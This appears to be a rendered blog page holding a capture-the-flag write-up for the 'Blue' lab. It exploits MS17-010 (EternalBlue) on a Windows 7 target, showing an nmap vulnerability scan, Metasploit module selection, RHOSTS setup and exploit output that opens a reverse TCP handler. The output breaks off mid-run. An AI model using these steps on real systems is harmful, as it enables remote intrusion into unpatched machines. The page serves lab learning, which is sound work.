+    <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem" class="breadcrumb__item"><button class="breadcrumb__current breadcrumb__current--clickable" 
+                aria-current="page"
+                aria-expanded="false"
+                aria-controls="article-metadata-panel"
+                data-metadata-toggle
+                itemprop="item">
+          <span itemprop="name">Blue</span>
+          <svg class="breadcrumb__metadata-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
+          </svg>
+        </button><meta itemprop="position" content="2" />
+    </li>
+  </ol>
+</nav><div class="article-header__actions">
+      
+<div class="article-header__copy-page relative" data-component="copy-page">
+  <button 
+    class="article-header__copy-toggle" 
+    type="button"
+    aria-expanded="false"
+    aria-haspopup="true"
+    data-copy-page-toggle>
+    <span class="article-header__copy-text">Share</span>
+    <svg class="article-header__copy-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path>
+    </svg>
+    <svg class="article-header__copy-arrow" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-dropdown-arrow>
+      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
+    </svg>
+  </button>
+  
+  
+  <div 
+    class="article-header__copy-dropdown"
+    data-copy-page-dropdown
+    data-state="hidden">
+    <div class="article-header__copy-dropdown-content">
+      
+      <button 
+        class="copy-page-menu-item"
+        data-copy-url="//localhost:1313/posts/blue/">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"></path>
+        </svg>
+        Copy URL
+      </button>
+      
+      
+      
+      
+      
+      
+      <a 
+        href="//localhost:1313/posts/blue/index.txt"
+        target="_blank"
+        rel="noopener noreferrer"
+        class="copy-page-menu-item"
+        data-open-txt>
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6v12m6-6H6"></path>
+        </svg>
+        Open LLM text
+      </a>
+      <button 
+        class="copy-page-menu-item"
+        data-copy-txt="//localhost:1313/posts/blue/index.txt">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path>
+        </svg>
+        Copy LLM text
+      </button>
+
+      
+      <button 
+        class="copy-page-menu-item"
+        data-copy-content>
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path>
+        </svg>
+        Copy content
+      </button>
+      
+      <hr class="copy-page-separator">
+      
+      
+      <div class="copy-page-section-header">
+        Share with AI
+      </div>
+      
+      
+      <a 
+        href="https://claude.ai/chat?q=Please%20help%20me%20understand%20this%20documentation%3A%20%2F%2Flocalhost%3A1313%2Fposts%2Fblue%2F"
+        target="_blank"
+        rel="noopener noreferrer"
+        class="copy-page-menu-item">
+        <svg viewBox="0 0 24 24" fill="currentColor">
+          <path d="M12 2L2 7v10l10 5 10-5V7l-10-5z"/>
+        </svg>
+        Ask Claude
+      </a>
+      
+      
+      <a 
+        href="https://chat.openai.com/?q=Please%20help%20me%20understand%20this%20documentation%3A%20%2F%2Flocalhost%3A1313%2Fposts%2Fblue%2F"
+        target="_blank"
+        rel="noopener noreferrer"
+        class="copy-page-menu-item">
+        <svg viewBox="0 0 24 24" fill="currentColor">
+          <path d="M22.282 9.821a5.985 5.985 0 0 0-.516-4.91 6.046 6.046 0 0 0-6.51-2.9A6.065 6.065 0 0 0 4.888 4.36a5.99 5.99 0 0 0-2.907 6.507 6.018 6.018 0 0 0 .517 4.91 6.05 6.05 0 0 0 6.51 2.9A6.065 6.065 0 0 0 19.376 16.64a5.99 5.99 0 0 0 2.907-6.507l-.001-.312z"/>
+        </svg>
+        Ask ChatGPT
+      </a>
+      
+      
+      <a 
+        href="https://copilot.microsoft.com/?q=Please%20help%20me%20understand%20this%20documentation%3A%20%2F%2Flocalhost%3A1313%2Fposts%2Fblue%2F"
+        target="_blank" 
+        rel="noopener noreferrer"
+        class="copy-page-menu-item">
+        <svg viewBox="0 0 24 24" fill="currentColor">
+          <path d="M12.5 2C8.9 2 6 4.9 6 8.5c0 1.2.3 2.3.8 3.3L12 21l5.2-9.2c.5-1 .8-2.1.8-3.3C18 4.9 15.1 2 11.5 2z"/>
+        </svg>
+        Ask Copilot
+      </a>
+    </div>
+  </div>
+</div></div>
+  </div>
+
+  <div 
+    id="article-metadata-panel" 
+    class="article-header__metadata-panel"
+    aria-hidden="true"
+    data-metadata-panel><div class="metadata" data-component="article-metadata">
+    <div class="metadata__flow">
+      <div class="metadata__item">
+          <svg class="metadata__icon" fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M6 2a1 1 0 00-1 1v1H4a2 2 0 00-2 2v10a2 2 0 002 2h12a2 2 0 002-2V6a2 2 0 00-2-2h-1V3a1 1 0 10-2 0v1H7V3a1 1 0 00-1-1zm0 5a1 1 0 000 2h8a1 1 0 100-2H6z" clip-rule="evenodd"></path>
+          </svg>
+          <time datetime="2020-02-12T14:35:31&#43;01:00">
+            Feb 12, 2020
+          </time>
+        </div><div class="metadata__item">
+          <svg class="metadata__icon" fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clip-rule="evenodd"></path>
+          </svg>
+          <span>13 min read</span>
+        </div><div class="metadata__item">
+          <svg class="metadata__icon" fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M4 4a2 2 0 012-2h8a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2V4zm2 0v12h8V4H6z" clip-rule="evenodd"></path>
+          </svg>
+          <span>2605 words</span>
+        </div><div class="metadata__item metadata__item--secondary">
+          <svg class="metadata__icon" fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z" clip-rule="evenodd"></path>
+          </svg>
+          <span>Updated Apr 27</span>
+        </div></div>
+  </div></div></div>
+  </div>
+  <article class="prose mx-auto max-w-3xl xl:max-w-4xl 2xl:max-w-5xl">
+    <header class="mb-6 not-prose">
+        <h1 class="text-3xl font-bold mb-3" style="color: var(--color-text-primary);">Blue</h1></header>
+
+    <div id="articleContent" class="article-content">
+      <p>Hello everyone, today we look at the CTF with <a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010">MS17-010</a> vulnerability.
+So let&rsquo;s start with nmap scan.</p>
+<div class="code-block-enhanced">
+    
+    <div class="code-header">
+        <span class="code-language">bash</span>
+        <div class="code-actions">
+            <button class="btn btn--sm btn--ghost copy-code" data-clipboard-target="#code-1760543465660635000" data-component="article-clipboard">
+                <svg class="btn__icon copy-icon w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/>
+                </svg>
+                
+            </button>
+            <button class="btn btn--sm btn--ghost ask-ai" type="button" aria-label="Ask AI about this code" data-clipboard-target="#code-1760543465660635000" data-ai-prompt="Explain this code snippet">
+                <img src="/icons/light/assistant.svg" alt="Ask AI" class="btn__icon w-4 h-4 icon" />
+            </button>
+        </div>
+    </div>
+    
+    
+    <div class="code-content" id="code-1760543465660635000"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ nmap -sV -p0-1000 --script vuln 10.10.223.243
+</span></span><span style="display:flex;"><span>Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-02-12 14:40 CET
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.223.243
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.043s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed ports
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE      VERSION
+</span></span><span style="display:flex;"><span>135/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>|_clamav-exec: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>|_clamav-exec: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds Microsoft Windows <span style="color:#ae81ff">7</span> - <span style="color:#ae81ff">10</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_clamav-exec: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Host script results:
+</span></span><span style="display:flex;"><span>|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+</span></span><span style="display:flex;"><span>|_smb-vuln-ms10-054: false
+</span></span><span style="display:flex;"><span>|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+</span></span><span style="display:flex;"><span>| smb-vuln-ms17-010: 
+</span></span><span style="display:flex;"><span>|   VULNERABLE:
+</span></span><span style="display:flex;"><span>|   Remote Code Execution vulnerability in Microsoft SMBv1 servers <span style="color:#f92672">(</span>ms17-010<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|     State: VULNERABLE
+</span></span><span style="display:flex;"><span>|     IDs:  CVE:CVE-2017-0143
+</span></span><span style="display:flex;"><span>|     Risk factor: HIGH
+</span></span><span style="display:flex;"><span>|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+</span></span><span style="display:flex;"><span>|        servers <span style="color:#f92672">(</span>ms17-010<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>|           
+</span></span><span style="display:flex;"><span>|     Disclosure date: 2017-03-14
+</span></span><span style="display:flex;"><span>|     References:
+</span></span><span style="display:flex;"><span>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2017-0143
+</span></span><span style="display:flex;"><span>|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+</span></span><span style="display:flex;"><span>|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 23.73 seconds</span></span></code></pre></div></div>
+</div>
+
+<p><strong>How many ports are open with a port number under 1000?:</strong></p>
+<ul>
+<li>3</li>
+</ul>
+<p><strong>What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)</strong></p>
+<ul>
+<li>ms17-010</li>
+</ul>
+<p>MS17-010 is very <a href="https://github.com/rapid7/metasploit-framework/issues/11964">unstable</a> exploit, it doesn&rsquo;t work in my linux or macos machine. But it works in my android with <a href="https://termux.com">termux</a> app. You can also buy PRO account and use their own kali machine.
+So now I connect to my android phone and then we will continue to exploit server</p>
+<div class="code-block-enhanced">
+    
+    <div class="code-header">
+        <span class="code-language">bash</span>
+        <div class="code-actions">
+            <button class="btn btn--sm btn--ghost copy-code" data-clipboard-target="#code-1760543465666263000" data-component="article-clipboard">
+                <svg class="btn__icon copy-icon w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/>
+                </svg>
+                
+            </button>
+            <button class="btn btn--sm btn--ghost ask-ai" type="button" aria-label="Ask AI about this code" data-clipboard-target="#code-1760543465666263000" data-ai-prompt="Explain this code snippet">
+                <img src="/icons/light/assistant.svg" alt="Ask AI" class="btn__icon w-4 h-4 icon" />
+            </button>
+        </div>
+    </div>
+    
+    
+    <div class="code-content" id="code-1760543465666263000"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ssh 192.168.xx.yy -p8022 -lxxx_yyy
+</span></span><span style="display:flex;"><span>Welcome to Termux!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Wiki:            https://wiki.termux.com
+</span></span><span style="display:flex;"><span>Community forum: https://termux.com/community
+</span></span><span style="display:flex;"><span>Gitter chat:     https://gitter.im/termux/termux
+</span></span><span style="display:flex;"><span>IRC channel:     <span style="color:#75715e">#termux on freenode</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Working with packages:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Search packages:   pkg search &lt;query&gt;
+</span></span><span style="display:flex;"><span> * Install a package: pkg install &lt;package&gt;
+</span></span><span style="display:flex;"><span> * Upgrade packages:  pkg upgrade
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Subscribing to additional repositories:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Root:     pkg install root-repo
+</span></span><span style="display:flex;"><span> * Unstable: pkg install unstable-repo
+</span></span><span style="display:flex;"><span> * X11:      pkg install x11-repo
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Report issues at https://termux.com/issues
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$</span></span></code></pre></div></div>
+</div>
+
+<p>Now we can continue as on any other devices, so let&rsquo;s start <em>metasploit</em></p>
+<div class="code-block-enhanced">
+    
+    <div class="code-header">
+        <span class="code-language">bash</span>
+        <div class="code-actions">
+            <button class="btn btn--sm btn--ghost copy-code" data-clipboard-target="#code-1760543465668607000" data-component="article-clipboard">
+                <svg class="btn__icon copy-icon w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/>
+                </svg>
+                
+            </button>
+            <button class="btn btn--sm btn--ghost ask-ai" type="button" aria-label="Ask AI about this code" data-clipboard-target="#code-1760543465668607000" data-ai-prompt="Explain this code snippet">
+                <img src="/icons/light/assistant.svg" alt="Ask AI" class="btn__icon w-4 h-4 icon" />
+            </button>
+        </div>
+    </div>
+    
+    
+    <div class="code-content" id="code-1760543465668607000"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Unable to handle kernel NULL pointer dereference at virtual address 0xd34db33f                                                                         
+</span></span><span style="display:flex;"><span>EFLAGS: <span style="color:#ae81ff">00010046</span>                                                                                                                                              
+</span></span><span style="display:flex;"><span>eax: <span style="color:#ae81ff">00000001</span> ebx: f77c8c00 ecx: <span style="color:#ae81ff">00000000</span> edx: f77f0001                                                                                                       
+</span></span><span style="display:flex;"><span>esi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60
+</span></span><span style="display:flex;"><span>ds: <span style="color:#ae81ff">0018</span>   es: <span style="color:#ae81ff">0018</span>  ss: <span style="color:#ae81ff">0018</span>
+</span></span><span style="display:flex;"><span>Process Swapper <span style="color:#f92672">(</span>Pid: 0, process nr: 0, stackpage<span style="color:#f92672">=</span>80377000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Stack: <span style="color:#ae81ff">90909090990909090990909090</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">90909090990909090990909090</span>
+</span></span><span style="display:flex;"><span>       90909090.90909090.90909090
+</span></span><span style="display:flex;"><span>       90909090.90909090.90909090
+</span></span><span style="display:flex;"><span>       90909090.90909090.09090900
+</span></span><span style="display:flex;"><span>       90909090.90909090.09090900
+</span></span><span style="display:flex;"><span>       ..........................
+</span></span><span style="display:flex;"><span>       cccccccccccccccccccccccccc
+</span></span><span style="display:flex;"><span>       cccccccccccccccccccccccccc
+</span></span><span style="display:flex;"><span>       ccccccccc.................
+</span></span><span style="display:flex;"><span>       cccccccccccccccccccccccccc
+</span></span><span style="display:flex;"><span>       cccccccccccccccccccccccccc
+</span></span><span style="display:flex;"><span>       .................ccccccccc
+</span></span><span style="display:flex;"><span>       cccccccccccccccccccccccccc
+</span></span><span style="display:flex;"><span>       cccccccccccccccccccccccccc
+</span></span><span style="display:flex;"><span>       ..........................
+</span></span><span style="display:flex;"><span>       ffffffffffffffffffffffffff
+</span></span><span style="display:flex;"><span>       ffffffff..................
+</span></span><span style="display:flex;"><span>       ffffffffffffffffffffffffff
+</span></span><span style="display:flex;"><span>       ffffffff..................
+</span></span><span style="display:flex;"><span>       ffffffff..................
+</span></span><span style="display:flex;"><span>       ffffffff..................
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Code: <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 I0 N5 <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>Aiee, Killing Interrupt handler
+</span></span><span style="display:flex;"><span>Kernel panic: Attempted to kill the idle task!
+</span></span><span style="display:flex;"><span>In swapper task - not syncing
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f92672">=[</span> metasploit v5.0.79-dev                          <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>+ -- --<span style="color:#f92672">=[</span> <span style="color:#ae81ff">1979</span> exploits - <span style="color:#ae81ff">1087</span> auxiliary - <span style="color:#ae81ff">339</span> post       <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>+ -- --<span style="color:#f92672">=[</span> <span style="color:#ae81ff">559</span> payloads - <span style="color:#ae81ff">45</span> encoders - <span style="color:#ae81ff">10</span> nops            <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>+ -- --<span style="color:#f92672">=[</span> <span style="color:#ae81ff">7</span> evasion                                       <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf5 &gt; search ms17-010
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Matching Modules
+</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#  Name                                           Disclosure Date  Rank     Check  Description</span>
+</span></span><span style="display:flex;"><span>   -  ----                                           ---------------  ----     -----  -----------
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span>  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">3</span>  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption <span style="color:#66d9ef">for</span> Win8+
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4</span>  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">5</span>  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution</span></span></code></pre></div></div>
+</div>
+
+<p><strong>Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/&hellip;&hellip;..)</strong></p>
+<ul>
+<li>exploit/windows/smb/ms17_010_eternalblue</li>
+</ul>
+<div class="code-block-enhanced">
+    
+    <div class="code-header">
+        <span class="code-language">bash</span>
+        <div class="code-actions">
+            <button class="btn btn--sm btn--ghost copy-code" data-clipboard-target="#code-1760543465676647000" data-component="article-clipboard">
+                <svg class="btn__icon copy-icon w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/>
+                </svg>
+                
+            </button>
+            <button class="btn btn--sm btn--ghost ask-ai" type="button" aria-label="Ask AI about this code" data-clipboard-target="#code-1760543465676647000" data-ai-prompt="Explain this code snippet">
+                <img src="/icons/light/assistant.svg" alt="Ask AI" class="btn__icon w-4 h-4 icon" />
+            </button>
+        </div>
+    </div>
+    
+    
+    <div class="code-content" id="code-1760543465676647000"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue
+</span></span><span style="display:flex;"><span>msf5 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; show options
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>exploit/windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name           Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----           ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   RHOSTS                          yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, range CIDR identifier, or hosts file with syntax <span style="color:#e6db74">&#39;file:&lt;path&gt;&#39;</span>
+</span></span><span style="display:flex;"><span>   RPORT          <span style="color:#ae81ff">445</span>              yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   SMBDomain      .                no        <span style="color:#f92672">(</span>Optional<span style="color:#f92672">)</span> The Windows domain to use <span style="color:#66d9ef">for</span> authentication
+</span></span><span style="display:flex;"><span>   SMBPass                         no        <span style="color:#f92672">(</span>Optional<span style="color:#f92672">)</span> The password <span style="color:#66d9ef">for</span> the specified username
+</span></span><span style="display:flex;"><span>   SMBUser                         no        <span style="color:#f92672">(</span>Optional<span style="color:#f92672">)</span> The username to authenticate as
+</span></span><span style="display:flex;"><span>   VERIFY_ARCH    true             yes       Check <span style="color:#66d9ef">if</span> remote architecture matches exploit Target.
+</span></span><span style="display:flex;"><span>   VERIFY_TARGET  true             yes       Check <span style="color:#66d9ef">if</span> remote OS matches exploit Target.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Exploit target:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Id  Name
+</span></span><span style="display:flex;"><span>   --  ----
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   Windows <span style="color:#ae81ff">7</span> and Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>x64<span style="color:#f92672">)</span> All Service Packs
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf5 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; set RHOSTS 10.10.223.243</span></span></code></pre></div></div>
+</div>
+
+<p><strong>Show options and set the one required value. What is the name of this value? (All caps for submission)</strong></p>
+<ul>
+<li>RHOSTS</li>
+</ul>
+<div class="code-block-enhanced">
+    
+    <div class="code-header">
+        <span class="code-language">bash</span>
+        <div class="code-actions">
+            <button class="btn btn--sm btn--ghost copy-code" data-clipboard-target="#code-1760543465682503000" data-component="article-clipboard">
+                <svg class="btn__icon copy-icon w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/>
+                </svg>
+                
+            </button>
+            <button class="btn btn--sm btn--ghost ask-ai" type="button" aria-label="Ask AI about this code" data-clipboard-target="#code-1760543465682503000" data-ai-prompt="Explain this code snippet">
+                <img src="/icons/light/assistant.svg" alt="Ask AI" class="btn__icon w-4 h-4 icon" />
+            </button>
+        </div>
+    </div>
+    
+    
+    <div class="code-content" id="code-1760543465682503000"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf5 exploit<span style="color:#f92672">(</span>windows/smb/ms17_010_eternalblue<span style="color:#f92672">)</span> &gt; exploit
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.8.11.158:4444 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.223.243:445     - Host is likely VULNERABLE to MS17-010! - Windows <span style="color:#ae81ff">7</span> Professional <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> x64 <span style="color:#f92672">(</span>64-bit<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445     - Scanned <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> hosts <span style="color:#f92672">(</span>100% complete<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.223.243:445 - Connecting to target <span style="color:#66d9ef">for</span> exploitation.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.223.243:445 - Connection established <span style="color:#66d9ef">for</span> exploitation.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.223.243:445 - Target OS selected valid <span style="color:#66d9ef">for</span> OS indicated by SMB reply
